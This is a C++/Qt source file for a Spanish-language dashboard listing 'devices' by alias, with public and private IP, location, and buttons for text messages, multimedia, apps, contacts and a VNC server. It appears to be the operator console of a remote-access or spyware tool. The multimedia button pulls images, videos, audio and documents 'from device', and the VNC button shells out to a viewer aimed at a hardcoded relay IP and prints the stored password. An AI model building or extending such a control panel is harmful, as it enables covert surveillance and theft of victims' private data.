/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include "HomeScreen.h"
#include <iostream>
#include <QTableWidget>
#include <QHeaderView>
#include <QScroller>
#include <QMessageBox>
#include "QObject"
#include "QDebug"
#include <QStyledItemDelegate>
#include <QPainter>

class ElidedItemDelegate : public QStyledItemDelegate {
public:
    explicit ElidedItemDelegate(QObject *parent = nullptr) : QStyledItemDelegate(parent) {}

    void paint(QPainter *painter, const QStyleOptionViewItem &option, const QModelIndex &index) const override {
        // Get text from celd
        QString text = index.data(Qt::DisplayRole).toString();

        QString elidedText = option.fontMetrics.elidedText(text, Qt::ElideRight, option.rect.width());

        QStyleOptionViewItem elidedOption(option);
        elidedOption.text = elidedText;

        QStyledItemDelegate::paint(painter, elidedOption, index);
    }
};


void HomeScreen::handleVncButtonClick() {
    qDebug() << "Hola Mundo";
}

void HomeScreen::showDevicesTable(
    const std::vector<DevicesHandler>& devices,
    QVBoxLayout* layout,
    QTableWidget* &table
) {
    // Clean table if exist it
    if (table) {
        layout->removeWidget(table);
        table->deleteLater();  // Delete widget of the table
    }

    infoRepository = new InfoRepositoryImp();
    multimediaRepository = new MultimediaRepositoryImp();


    // Create table
    table = new QTableWidget(static_cast<int>(devices.size()), 10);
    
    // Title tables
    table->setHorizontalHeaderLabels(
        QStringList() <<
            "Alias" <<
            "Nombre" <<
            "Dirección IP pública" <<
            "Dirección IP privada" <<
            "Localización" <<
            "Mensajes de texto" <<
            "Multimedia" <<
            "Apps" <<
            "Contactos" <<
            "Servidor Vnc" 

    );


    QFont boldFont;
    boldFont.setBold(true);
    
    int row = 0;
    
    for (const auto& device : devices) {

        // Alias
        QTableWidgetItem* aliasItem = new QTableWidgetItem(QString::fromStdString(device.alias));
        aliasItem->setFont(boldFont); 
        aliasItem->setForeground(QColor("#edff21"));
        table->setItem(row, 0, aliasItem);

        // Name
        QTableWidgetItem* nameItem = new QTableWidgetItem(QString::fromStdString(device.name));
        nameItem->setForeground(QColor("#e3e3e3"));
        table->setItem(row, 1, nameItem);

        // Public IP Address
        QTableWidgetItem* ipPublicItem = new QTableWidgetItem(QString::fromStdString(device.ip_address_public));
        ipPublicItem->setFont(boldFont);
        ipPublicItem->setForeground(QColor("#e3e3e3"));
        table->setItem(row, 2, ipPublicItem);

        // Private IP Address
        QTableWidgetItem* ipPrivateItem = new QTableWidgetItem(QString::fromStdString(device.ip_address_private));
        ipPrivateItem->setFont(boldFont);
        ipPrivateItem->setForeground(QColor("#e3e3e3"));
        table->setItem(row, 3, ipPrivateItem);

        // Location
        QTableWidgetItem* locationItem = new QTableWidgetItem(QString::fromStdString(device.location));
        locationItem->setForeground(QColor("#00913f"));
        table->setItem(row, 4, locationItem);

        // Messages
        QPushButton* messagesButton = new QPushButton();
        QIcon messagesIcon(":/drawable/messages.png");  
        
        messagesButton->setIcon(messagesIcon);
        messagesButton->setIconSize(QSize(25, 25));  
        messagesButton->setFlat(true);  
        
        table->setCellWidget(row, 5, messagesButton);  
        
        QObject::connect(messagesButton, &QPushButton::clicked, [this, device]() {
            emit goToSms(QString::fromStdString(device.alias));  // Change to Sms and pass alias actual
        });

        // Multimedia
        QPushButton* multimediaButton = new QPushButton();
        QIcon multimediaIcon(":/drawable/multimedia.png");  

        multimediaButton->setIcon(multimediaIcon);
        multimediaButton->setIconSize(QSize(30, 30));  
        multimediaButton->setFlat(true);  

        table->setCellWidget(row, 6, multimediaButton);  
        QObject::connect(multimediaButton, &QPushButton::clicked, [this, device]() {
            // Download Multimedia from device with the alias
            multimediaRepository->getImages(device.alias);
            multimediaRepository->getVideos(device.alias);
            multimediaRepository->getAudios(device.alias);
            multimediaRepository->getDocuments(device.alias);

            emit goToMultimedia(QString::fromStdString(device.alias));  // Change to Sms and pass alias actual
        });

        // Apps
        QPushButton* appsButton = new QPushButton();
        QIcon appsIcon(":/drawable/apps.png");  

        appsButton->setIcon(appsIcon);
        appsButton->setIconSize(QSize(25, 25));  
        appsButton->setFlat(true);  
        
        table->setCellWidget(row, 7, appsButton);  
        QObject::connect(appsButton, &QPushButton::clicked, []() {
            qDebug() << "Hola Mundo";
        });


        // Contacts
        QPushButton* contactsButton = new QPushButton();
        QIcon contactsIcon(":/drawable/contacts.png");  
        
        contactsButton->setIcon(contactsIcon);
        contactsButton->setIconSize(QSize(25, 25));  
        contactsButton->setFlat(true);  
        
        table->setCellWidget(row, 8, contactsButton);  
        QObject::connect(contactsButton, &QPushButton::clicked, []() {
            qDebug() << "Hola Mundo";
        });

        // Vnc Server

        if (!infoRepository->getInfo(device.alias).empty()) {

            QPushButton* vncButton = new QPushButton();
            QIcon vncIcon(":/drawable/play.png");  
            
            vncButton->setIcon(vncIcon);
            vncButton->setIconSize(QSize(20, 20));  
            vncButton->setFlat(true);  
            

            table->setCellWidget(row, 9, vncButton);  

            QObject::connect(vncButton, &QPushButton::clicked, [this, device]() {
                infoHandler = infoRepository->getInfo(device.alias);

                std::string _ipAddress = "217.15.171.116";

                std::string _password = infoHandler[0].vnc_password;
                std::string _port = infoHandler[0].vnc_port;
                int _port_ = std::stoi(_port);

                QString ip = QString::fromStdString(_ipAddress);
                QString port = QString::number(_port_);

                QString command = 
                QString("bash -c '/tmp/vnc_viewer %1:%2 &' 2>/dev/null")
                    .arg(ip)
                    .arg(port);

                std::cout << command.toStdString().c_str() << std::endl;      

                system(command.toStdString().c_str());
                std::cout << "Password: " << _password << std::endl;
                
            });
        } else {
            std::string message = "Servidor apagado";
            QTableWidgetItem* vncServer = new QTableWidgetItem(
                QString::fromStdString(message)
            );
            vncServer->setForeground(QBrush(QColor("#CB1D11")));
            table->setItem(row, 9, vncServer);
        }

        ++row;
    }

    table->setItemDelegate(new ElidedItemDelegate(table));

    table->setSelectionMode(QAbstractItemView::SingleSelection);
    table->setSelectionBehavior(QAbstractItemView::SelectItems);

    // Resize columns
    for (int col = 0; col < table->columnCount(); ++col) {
        table->resizeColumnToContents(col);
    }

    // Fit rows to content
    table->resizeRowsToContents();

    table->horizontalHeader()->setSectionResizeMode(QHeaderView::Interactive);
    table->verticalHeader()->setSectionResizeMode(QHeaderView::Interactive);
    table->horizontalHeader()->setMinimumSectionSize(120); 
    table->verticalHeader()->setMinimumSectionSize(45);  


    // Disable table editing
    table->setEditTriggers(QAbstractItemView::NoEditTriggers);

    QPalette palette = table->palette();
    palette.setColor(QPalette::Base, QColor("#260006"));
    table->setPalette(palette);
    table->setAutoFillBackground(true);
    table->setBackgroundRole(QPalette::Base);
    

    table->setStyleSheet(
        "QTableWidget {"
        "    background-image: url(:/drawable/background.png);"
        "    background-position: center;"
        "    background-repeat: no-repeat;"
        "    width: 100px;"
        "    height: 100px;"
        "}"
        "QScrollBar:vertical {"
        "    background: #390009;"
        "    width: 10px;"
        "}"
        "QScrollBar::handle:vertical {"
        "    background: #A9A9A9;"
        "    min-height: 10px;"
        "}"
        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {"
        "    background: #2E2E2E;"
        "    height: 0px;"
        "}"
        "QScrollBar:horizontal {"
        "    background: #390009;"
        "    height: 10px;"
        "}"
        "QScrollBar::handle:horizontal {"
        "    background: #A9A9A9;"
        "    min-width: 10px;"
        "}"
        "QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {"
        "    background: #390009;"
        "    width: 0px;"
        "}"

        "QTableWidget::item:selected {"
        "    background-color: #390009;"
        "}"    
    );

    layout->addWidget(table);
}


void HomeScreen::searchDevice() {
    QString searchText = textField->text().trimmed();

    if (searchText.isEmpty()) {
        QMessageBox::warning(this, "Campo vacío",
            "Por favor, ingrese un alias para buscar."
         );
    } else {

        std::string alias = searchText.toStdString();
        std::cout << alias << std::endl;
        std::vector<DevicesHandler> result = devicesRepository->getDevice(searchText.toStdString());

        if (result.empty()) {
            QMessageBox::information(this, "No encontrado",
                "No se encontró un dispositivo con ese alias llamado así. Escriba 'ALL' para visualizar todos los dispositivos"
             );
        } else {
            showDevicesTable(result, layout, table);
        }
    }
}


HomeScreen::HomeScreen(QWidget *parent) : QWidget(parent), table(nullptr) {
    
    devicesRepository = new DevicesRepositoryImp();
    std::string ALL = "ALL";
    devices = devicesRepository->getDevice(ALL);

    this->setMinimumSize(600, 500);
    QPalette pal = this->palette();
    pal.setColor(QPalette::Background, QColor("#260006"));
    this->setAutoFillBackground(true);
    this->setPalette(pal);

    layout = new QVBoxLayout(this);

    if (!devices.empty()) {

        // Create TextField
        QHBoxLayout* topLayout = new QHBoxLayout();
        textField = new QLineEdit(this);
        textField->setPlaceholderText("Buscar dispositivo (por su alias)...");
        textField->setStyleSheet("QLineEdit { color: #ffffff; background-color: #390009; }");
        textField->setFixedWidth(400);

        // Create Button Search
        button = new QPushButton("Buscar", this);
        button->setFixedWidth(150);

        // Connect button enter to the textfield
        connect(button, &QPushButton::clicked, this, &HomeScreen::searchDevice);
        connect(textField, &QLineEdit::returnPressed, this, &HomeScreen::searchDevice);

        QSpacerItem* spacer = new QSpacerItem(10, 10, QSizePolicy::Expanding, QSizePolicy::Minimum);
        topLayout->addItem(spacer);

        // Add widgets to the view
        topLayout->addWidget(textField);
        topLayout->addWidget(button);
        
        layout->addLayout(topLayout);
        
        showDevicesTable(devices, layout, table);
    } else {
        label = new QLabel("No se encontró información", this);
        label->setAlignment(Qt::AlignCenter);
        label->setStyleSheet(
            "QLabel { "
            "    color : white; "            
            "    font-weight: bold; "            
            "    font-size: 30px; "             
            "    background-image: url(:/drawable/background.png); "
            "    background-position: center; " 
            "    background-repeat: no-repeat; "
            "    width: 100px; "               
            "    height: 100px; "   
            "   padding-bottom: 150px; "            
            "}"
        );

        layout->addWidget(label);

    }
    setLayout(layout);
}



